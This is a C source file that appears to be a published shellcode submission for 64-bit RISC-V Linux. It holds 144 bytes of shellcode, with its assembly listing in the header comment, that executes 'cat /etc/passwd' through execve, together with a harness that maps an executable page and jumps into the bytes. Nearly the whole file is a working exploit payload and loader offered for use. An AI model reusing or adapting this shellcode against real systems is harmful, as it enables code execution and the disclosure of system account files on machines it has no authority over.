/*
 * - arch: RISC-V (RV64I)
 * - env: QEMU
 * - uname: Linux debian 6.12.30-riscv64 #1 SMP Debian 6.12.30-1 (2025-05-28) riscv64 GNU/Linux
 * - title: execve("/usr/bin/cat", ["/usr/bin/cat", "/etc/passwd", NULL], NULL) 144 bytes shellcode
 * - author: Paulus Gandung Prakosa <rvn.plvhx@gmail.com>
 *
 * [asm]
 *   slt a7, x0, -1
 *   addi a7, a7, 221
 *   slt a0, x0, -1
 *   li a0, 0x7273752f
 *   sw a0, -16(sp)
 *   li a0, 0x6e69622f
 *   sw a0, -12(sp)
 *   li a0, 0x7461632f
 *   sw a0, -8(sp)
 *   slt a5, x0, -1
 *   sw a5, -4(sp)
 *   slt a0, x0, -1
 *   addi a0, sp, -16
 *   slt a6, x0, -1
 *   li a6, 0x74652f2f
 *   sw a6, -32(sp)
 *   li a6, 0x61702f63
 *   sw a6, -28(sp)
 *   li a6, 0x64777373
 *   sw a6, -24(sp)
 *   sw a5, -20(sp)
 *   slt a6, x0, -1
 *   addi a6, sp, -32
 *   sd a0, -56(sp)
 *   sd a6, -48(sp)
 *   sd a5, -40(sp)
 *   slt a1, x0, -1
 *   addi a1, sp, -56
 *   slt a2, x0, -1
 *   ecall
 * [/asm]
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

static unsigned char *shellcode = "\x93\x28\xf0\xff\x93\x88\xd8\x0d\x13\x25\xf0\xff\x37\x75\x73\x72"
                                  "\x1b\x05\xf5\x52\x23\x28\xa1\xfe\x37\x65\x69\x6e\x1b\x05\xf5\x22"
                                  "\x23\x2a\xa1\xfe\x37\x65\x61\x74\x1b\x05\xf5\x32\x23\x2c\xa1\xfe"
                                  "\x93\x27\xf0\xff\x23\x2e\xf1\xfe\x13\x25\xf0\xff\x13\x05\x01\xff"
                                  "\x13\x28\xf0\xff\x37\x38\x65\x74\x1b\x08\xf8\xf2\x23\x20\x01\xff"
                                  "\x37\x38\x70\x61\x1b\x08\x38\xf6\x23\x22\x01\xff\x37\x78\x77\x64"
                                  "\x1b\x08\x38\x37\x23\x24\x01\xff\x23\x26\xf1\xfe\x13\x28\xf0\xff"
                                  "\x13\x08\x01\xfe\x23\x34\xa1\xfc\x23\x38\x01\xfd\x23\x3c\xf1\xfc"
                                  "\x93\x25\xf0\xff\x93\x05\x81\xfc\x13\x26\xf0\xff\x73\x00\x00\x00";

int main(void)
{
    void (*pcall)(int, int);

    pcall = mmap(NULL, sysconf(_SC_PAGESIZE),
                 PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (pcall == MAP_FAILED) {
        perror("mmap");
        return -1;
    }

    memcpy(pcall, shellcode, strlen(shellcode));
    pcall(0, 0);

    return 0;
}
